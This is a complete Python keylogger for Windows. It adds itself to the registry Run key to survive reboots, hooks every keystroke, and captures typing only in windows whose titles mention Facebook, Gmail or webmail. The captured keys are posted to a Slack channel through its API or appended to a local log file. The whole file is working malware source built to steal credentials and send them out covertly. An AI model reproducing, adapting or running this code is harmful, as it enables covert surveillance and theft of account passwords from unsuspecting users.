import pythoncom
import pyHook
import os
import sys
import win32event, win32api, winerror
import configparser
import time
from datetime import datetime
from slackclient import SlackClient
from _winreg import *

#########################################
#		INITIALIZATION VARIABLES		#
#########################################

# Slack link:
config = configparser.ConfigParser()
config.read('slack.ini')
slack_channel = config['channel']['ch1']
slack_token = config['token']['tk1']
slack_client = SlackClient(slack_token)

# File info
FILE = 'logfile.log'
# Buffer info
DATA = ''
DATA_LENGTH = 50

# Keywords for algorithm
key_words = ['FACEBOOK', 'GMAIL', 'WEBMAIL']

# Log configuration
# MODE 0: log on local file
# MODE 1: log on slack server
MODE = 1

#################################
#		KEYLOGGER FUNCTIONS 	#
#################################

def persist():
	'''Adds the executable file at startup Windows app'''
	path_to_exe = sys.argv[0]
	sub_key = 'Software\Microsoft\Windows\CurrentVersion\Run'
	with OpenKey(HKEY_CURRENT_USER, sub_key, 0, KEY_ALL_ACCESS) as key:
		SetValueEx(key, "Keylogger", 0, REG_SZ, path_to_exe)

def on_keyboard(event):
	'''function that is executed every time the event KeyDown is detected'''
	global DATA
	if is_relevant_window(event.WindowName, key_words):
		if event.Ascii == 13: # return pressed
			key_pressed = '[RETURN]'
		elif event.Ascii == 9: # tab pressed
			key_pressed = '[TAB]'
		elif event.Ascii == 8:
			key_pressed = '[BACK]'
		else:
			# convert pressed key using Ascii look up table
			key_pressed = chr(event.Ascii)
		# add key stroke to buffer DATA
		DATA += key_pressed
		if len(DATA) >= DATA_LENGTH:
			# if buffer DATA is full, log the buffer
			log_info = {'datum': datetime.now().__str__(), 'WindowName': event.WindowName,
						'DATA': DATA}
			log = "{d[datum]} :: {d[WindowName]} :: {d[DATA]} \n".format(d=log_info)
			if MODE == 0:
				log_on_file(FILE, log)
			elif MODE == 1:
				log_on_cloud(slack_client, slack_channel, log)
			DATA = ''
	return True

def log_on_file(file, DATA):
	'''append the input DATA in the log file'''
	with open(file, 'a') as f:
		f.write(DATA)

def log_on_cloud(client, channel, DATA):
	'''log the DATA collected in a Slack server'''
	client.api_call(
		"chat.postMessage",
		channel=channel,
		text=DATA)

#################################
#		ALGORITHM RELEVANT  	#
#################################

def is_relevant_window(WindowName, key_words):
	'''check if the current visited window is worth to be spied by checking
	the key_words list'''
	res = False
	upper_case_wn = WindowName.upper()
	for key_word in key_words:
		if key_word in upper_case_wn:
			res = True
	return res


####################
#		MAIN	   #
####################

if __name__ == '__main__':
	persist()
	hm = pyHook.HookManager()
	hm.SubscribeKeyDown(on_keyboard)
	hm.HookKeyboard()
	# infinite loop
	pythoncom.PumpMessages()
